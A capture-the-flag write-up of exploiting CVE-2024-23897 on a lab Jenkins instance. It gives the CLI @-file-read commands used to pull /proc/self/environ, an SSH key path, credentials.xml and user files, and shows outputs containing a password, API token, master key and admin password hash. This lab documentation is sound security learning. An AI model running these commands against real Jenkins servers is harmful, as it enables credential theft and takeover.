

## CI/CD 

Jenkins is here to help with all our ci/cd needs. What a great environment to work in!

Spun up target instance:
`http://glitch-two.3f30795e908a7c17.ctf.land:7756/`


### Initial Exploration

I have no prior experience with Jenkins, so I started by sending a simple curl request to the instance URL to see if anything obvious stood out.

```bash
angus@aLT:~/Documents/GitHub/ctf/$ curl -s -I http://glitch-two.3f30795e908a7c17.ctf.land:7756/login
HTTP/1.1 200 OK
Date: Sun, 25 May 2025 00:22:04 GMT
X-Content-Type-Options: nosniff
Content-Type: text/html;charset=utf-8
Expires: Thu, 01 Jan 1970 00:00:00 GMT
Cache-Control: no-cache,no-store,must-revalidate
X-Hudson: 1.395
X-Jenkins: 2.441
X-Jenkins-Session: 17d7b3ca
X-Frame-Options: sameorigin
Set-Cookie: JSESSIONID.e2bf0e51=node0iytnnetoqg59f2ww6kuacx5t2.node0; Path=/; HttpOnly
Content-Length: 1737
Server: Jetty(10.0.18)
```

The Jenkins version stood out `2.441`. I researched known CVEs for that version and discovered [`CVE-2024-23897`](https://nvd.nist.gov/vuln/detail/cve-2024-23897) a critical vulnerability allowing file reads via CLI @ argument expansion.


### Exploitation  
I began by downloading the `jenkins-cli.jar` file from:

`http://glitch-two.3f30795e908a7c17.ctf.land:7756/jnlpJars/jenkins-cli.jar` which would be needed to trigger jenkins commands on that instance.

From there, I experimented with Python scripts to enumerate paths and read files. 

`jenkins_file_read_results.txt` is the result of me spamming Python script variations to test file reads via the Jenkins CLI. It documents trial-and-error attempts across multiple assumed `JENKINS_HOME` paths, using help @<file> and who-am-i @<file> commands.

 Most attempts failed or returned partial XML headers, but it helped confirm file locations and read limitations for unauthenticated users.

Although I didn’t fully grasp Jenkins’ directory structure at first, I managed to discover this master.key.  

`b6404805b39ab9767403ea209f7930971d97026d1d3cd8864cdb09cf8aedd250d2e15bcff56897aab263bb59a549026ab6f12c195690c42e8acbdc45309f1642af4bcc13d1c9e7b84bf78f857535146de5e2ee2a955850fbfb4dc2c7adbda4dd92cbdd3d6d7390ae33eb95447f9aa9983e9ad4fcaad782ec03a5ba68504b7767`

After researching what could be done with it, I came across `https://github.com/hoto/jenkins-credentials-decryptor`, a tool that uses Jenkins’ internal secrets to decrypt stored credentials.

To fully decrypt the credentials, the following files are required:

```bash
$JENKINS_HOME/credentials.xml 
$JENKINS_HOME/secrets/master.key
$JENKINS_HOME/secrets/hudson.util.Secret
$JENKINS_HOME/jobs/example-folder/config.xml - Possible location
```

Unfortunately, due to permission restrictions as an unauthenticated user, and as observed in `jenkins_file_read_results.txt` I was only able to leak 2–3 lines at a time using commands like `help` and `who-am-i`

For example I was mainly getting XML headers and the start of the files as seen below.

```bash
angus@aLT:~/Documents/GitHub/ctf/jenkins$ java -jar jenkins-cli.jar -s http://glitch-two.3f30795e908a7c17.ctf.land:7756 help @/var/jenkins_home/credentials.xml

ERROR: Too many arguments: <com.cloudbees.plugins.credentials.SystemCredentialsProvider plugin="credentials@1380.va_435002fa_924">
java -jar jenkins-cli.jar help [COMMAND]
Lists all the available commands or a detailed description of single command.
 COMMAND : Name of the command (default: <?xml version='1.1' encoding='UTF-8'?>)
angus@aLT:~/Documents/GitHub/ctf/jenkins$ java -jar jenkins-cli.jar -s http://glitch-two.3f30795e908a7c17.ctf.land:7756 install-plugin @/var/jenkins_home/credentials.xml

ERROR: anonymous is missing the Overall/Read permission
```


### Authenticated Command Mapping

At this point, I was curious about which Jenkins CLI commands were accessible to anonymous users.

I created a script called findAuthCommands.py to test command availability with and without authentication. This helped me confirm that only `help` and `who-am-i` were viable anonymously. Then I validated some known paths with `pathEnum.py`:

- etc_passwd.tx
- var_jenkins_home_config.xml.txt
- var_jenkins_home_credentials.xml.txt
- var_jenkins_home_secrets_hudson.util.Secret.txt

In hindsight, this was a bit redundant since it mostly confirmed what I'd already discovered earlier in the process. 

### Leaking enviroment variables
Eventually I moved onto this command looking at `/proc/self/environ` which usually holds enviroment variables.

```bash
angus@aLT:~/Documents/GitHub/ctf/jenkins$ java -jar jenkins-cli.jar -s http://glitch-two.3f30795e908a7c17.ctf.land:7756 who-am-i "@/proc/self/environ"

ERROR: No argument is allowed: HOSTNAME=b7b8172c14b7JENKINS_UC_EXPERIMENTAL=https://updates.jenkins.io/experimentalJAVA_HOME=/opt/java/openjdkJENKINS_INCREMENTALS_REPO_MIRROR=https://repo.jenkins-ci.org/incrementalsFLAG1=Flag1.LeftMyFlagShowing.@>COPY_REFERENCE_FILE_LOG=/var/jenkins_home/copy_reference_file.logJENKINS_PASSWORD=cicdismyThangPWD=/JENKINS_SLAVE_AGENT_PORT=50000JENKINS_VERSION=2.441HOME=/var/jenkins_homeLANG=C.UTF-8JENKINS_URL=localhostJENKINS_UC=https://updates.jenkins.ioJENKINS_ID=developerSHLVL=0JENKINS_HOME=/var/jenkins_homeREF=/usr/share/jenkins/refPATH=/opt/java/openjdk/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
java -jar jenkins-cli.jar who-am-i
Reports your credential and permissions.
```

Running who-am-i with @/proc/self/environ worked:
- account: `developer`
- password: `cicdismyThang`
- FLAG1: `Flag1.LeftMyFlagShowin`


On the Jenkins dashboard, Job2 contained failed Git SSH jobs due to permission errors.

```bash
Started by user admin
Running as SYSTEM
Building in workspace /var/jenkins_home/workspace/Job2
[Job2] $ /bin/sh -xe /tmp/jenkins3977855085558897809.sh
+ git clone git@github.com:secretprojects/repo1.git
Cloning into 'repo1'...
git@github.com: Permission denied (publickey).
fatal: Could not read from remote repository.

Please make sure you have the correct access rights
and the repository exists.
Build step 'Execute shell' marked build as failure
Finished: FAILURE
```

I attempted to read related config files but this gave me only the first 2 lines I was still hitting a limitaiton on the leak.


`java -jar jenkins-cli.jar -s http://glitch-two.3f30795e908a7c17.ctf.land:7756 who-am-i "@/var/jenkins_home/jobs/Job2/config.xml"`


  then i tried
  `java -jar jenkins-cli.jar -s http://glitch-two.3f30795e908a7c17.ctf.land:7756 -webSocket help @/var/jenkins_home/.ssh/id_rsa`

  this worked giving me 

```bash
  ERROR: Too many arguments: # Flag2.MyKeyIsShowing^@#1
java -jar jenkins-cli.jar help [COMMAND]
Lists all the available commands or a detailed description of single command.
 COMMAND : Name of the command (default: # Flag on next line:)
 ```

I decided to poke around the admin console using a generated API token called `dev_token` to see if I could leak more data. 

My first target was the failed job from earlier, which I had previously tried to access but ran into limitations with the help and who-am-i commands.

 This time, all I managed to retrieve was the expected admin account and its identifier string.


```bash
java -jar jenkins-cli.jar -s http://glitch-two.3f30795e908a7c17.ctf.land:7756 -auth developer:11b761923d80e56860f480c20f5748d594 -webSocket connect-node @/var/jenkins_home/jobs/Job2/config.xml
```

```xml
<?xml version='1.1' encoding='UTF-8'?>
<hudson.model.UserIdMapper>
  <version>1</version>
  <idToDirectoryNameMap class="concurrent-hash-map">
    <entry>
      <string>admin</string>
      <string>admin_14925462988873490586</string> </entry>
    <entry>
      <string>developer</string>
      <string>developer_15237871593234261185</string> </entry>
    </idToDirectoryNameMap>
</hudson.model.UserIdMapper>
```

I tried to see if I could pull user info directly

```bash
java -jar jenkins-cli.jar -s http://glitch-two.3f30795e908a7c17.ctf.land:7756 -auth developer:11b76192no because its the same flag3d80e56860f480c20f5748d594 -webSocket connect-node @/var/jenkins_home/users/users.xml
```

```xml
<?xml version='1.1' encoding='UTF-8'?>
<user>
  <version>10</version>
  <id>admin</id>
  <fullName>admin</fullName>
  <properties>
    <hudson.model.PaneStatusProperties>
      <collapsed/>
    </hudson.model.PaneStatusProperties>
    <jenkins.security.ApiTokenProperty> <tokenStore>
        <tokenList/> </tokenStore>
    </jenkins.security.ApiTokenProperty>
    <com.cloudbees.plugins.credentials.UserCredentialsProvider_-UserCredentialsProperty plugin="credentials@1380.va_435002fa_924">
      <domainCredentialsMap class="hudson.util.CopyOnWriteMap$Hash"/> </com.cloudbees.plugins.credentials.UserCredentialsProvider_-UserCredentialsProperty>
    <hudson.model.MyViewsProperty>
      <views>
        <hudson.model.AllView>
          <owner class="hudson.model.MyViewsProperty" reference="../../.."/>
          <name>all</name>
          <filterExecutors>false</filterExecutors>
          <filterQueue>false</filterQueue>
          <properties class="hudson.model.View$PropertyList"/>
        </hudson.model.AllView>
      </views>
    </hudson.model.MyViewsProperty>
    <hudson.model.TimeZoneProperty/>
    <hudson.search.UserSearchProperty>
      <insensitiveSearch>true</insensitiveSearch>
    </hudson.search.UserSearchProperty>
    <jenkins.security.seed.UserSeedProperty>
      <seed>d1909e4b097f37f3</seed>
    </jenkins.security.seed.UserSeedProperty>
    <hudson.security.HudsonPrivateSecurityRealm_-Details>
      <passwordHash>#jbcrypt:$2a$10$TS1uvYR2zRJm2Ui5TcPgOe5uZHN97xPTk5H8Dzc4zJ8gvV0WPQwUi</passwordHash> </hudson.security.HudsonPrivateSecurityRealm_-Details>
    <jenkins.console.ConsoleUrlProviderUserProperty/>
    <jenkins.model.experimentalflags.UserExperimentalFlagsProperty>
      <flags/>
    </jenkins.model.experimentalflags.UserExperimentalFlagsProperty>
  </properties>
</user>
```

This dump included a hashed password for the admin account
`#jbcrypt:$2a$10$TS1uvYR2zRJm2Ui5TcPgOe5uZHN97xPTk5H8Dzc4zJ8gvV0WPQwUi`

At this point, I was tempted to toss it into John or Hashcat, but I wanted to keep digging to see if there were any more files I could leak as an authenticated user via CVE-2024-23897.


To get a better sense of what I could do as developer, I ran
`java -jar jenkins-cli.jar -s http://glitch-two.3f30795e908a7c17.ctf.land:7756 -auth developer:11b761923d80e56860f480c20f5748d594 -webSocket help`

giving me the output below.

```bash
add-job-to-view
    Adds jobs to view.
  apply-configuration
    Apply YAML configuration to instance
  build
    Builds a job, and optionally waits until its completion.
  cancel-quiet-down
    Cancel the effect of the "quiet-down" command.
  check-configuration
    Check YAML configuration to instance
  clear-queue
    Clears the build queue.
  connect-node
    Reconnect to a node(s)
  console
    Retrieves console output of a build.
  copy-job
    Copies a job.
  create-credentials-by-xml
    Create Credential by XML
  create-credentials-domain-by-xml
    Create Credentials Domain by XML
  create-job
    Creates a new job by reading stdin as a configuration XML file.
  create-node
    Creates a new node by reading stdin as a XML configuration.
  create-view
    Creates a new view by reading stdin as a XML configuration.
  delete-builds
    Deletes build record(s).
  delete-credentials
    Delete a Credential
  delete-credentials-domain
    Delete a Credentials Domain
  delete-job
    Deletes job(s).
  delete-node
    Deletes node(s)
  delete-view
    Deletes view(s).
  disable-job
    Disables a job.
  disable-plugin
    Disable one or more installed plugins.
  disconnect-node
    Disconnects from a node.
  enable-job
    Enables a job.
  enable-plugin
    Enables one or more installed plugins transitively.
  export-configuration
    Export jenkins configuration as YAML
  get-credentials-as-xml
    Get a Credentials as XML (secrets redacted)
  get-credentials-domain-as-xml
    Get a Credentials Domain as XML
  get-job
    Dumps the job definition XML to stdout.
  get-node
    Dumps the node definition XML to stdout.
  get-view
    Dumps the view definition XML to stdout.
  groovy
    Executes the specified Groovy script. 
  groovysh
    Runs an interactive groovy shell.
  help
    Lists all the available commands or a detailed description of single command.
  import-credentials-as-xml
    Import credentials as XML. The output of "list-credentials-as-xml" can be used as input here as is, the only needed change is to set the actual Secrets which are redacted in the output.
  install-plugin
    Installs a plugin either from a file, an URL, or from update center. 
  keep-build
    Mark the build to keep the build forever.
  list-changes
    Dumps the changelog for the specified build(s).
  list-credentials
    Lists the Credentials in a specific Store
  list-credentials-as-xml
    Export credentials as XML. The output of this command can be used as input for "import-credentials-as-xml" as is, the only needed change is to set the actual Secrets which are redacted in the output.
  list-credentials-context-resolvers
    List Credentials Context Resolvers
  list-credentials-providers
    List Credentials Providers
  list-jobs
    Lists all jobs in a specific view or item group.
  list-plugins
    Outputs a list of installed plugins.
  offline-node
    Stop using a node for performing builds temporarily, until the next "online-node" command.
  online-node
    Resume using a node for performing builds, to cancel out the earlier "offline-node" command.
  quiet-down
    Quiet down Jenkins, in preparation for a restart. Don’t start any builds.
  reload-configuration
    Discard all the loaded data in memory and reload everything from file system. Useful when you modified config files directly on disk.
  reload-jcasc-configuration
    Reload JCasC YAML configuration
  reload-job
    Reload job(s)
  remove-job-from-view
    Removes jobs from view.
  restart
    Restart Jenkins.
  safe-restart
    Safe Restart Jenkins. Don’t start any builds.
  safe-shutdown
    Puts Jenkins into the quiet mode, wait for existing builds to be completed, and then shut down Jenkins.
  session-id
    Outputs the session ID, which changes every time Jenkins restarts.
  set-build-description
    Sets the description of a build.
  set-build-display-name
    Sets the displayName of a build.
  shutdown
    Immediately shuts down Jenkins server.
  stop-builds
    Stop all running builds for job(s)
  update-credentials-by-xml
    Update Credentials by XML
  update-credentials-domain-by-xml
    Update Credentials Domain by XML
  update-job
    Updates the job definition XML from stdin. The opposite of the get-job command.
  update-node
    Updates the node definition XML from stdin. The opposite of the get-node command.
  update-view
    Updates the view definition XML from stdin. The opposite of the get-view command.
  version
    Outputs the current version.
  wait-node-offline
    Wait for a node to become offline.
  wait-node-online
    Wait for a node to become online.
  who-am-i
    Reports your credential and permissions.
```


At this point, I ran out of time but I wanted to attempt to leak admin account credentials as an authenticated user, or try to escalate my privilage through a misconfiguration or attempt to crack the admin hash. 

Based on the CTF structure, the most promising path seemed to be leaking additional secrets to fully compromise the instance highlighting the impact of CVE-2024-23897 and Jenkins CLI abuse.

This was a solid exercise in abusing the Jenkins CLI and CVE-2024-23897 to pivot from anonymous access to partial control (potentially full control) I had a ton of fun exploring how exposed Jenkins instances can be leveraged in real-world scenarios.


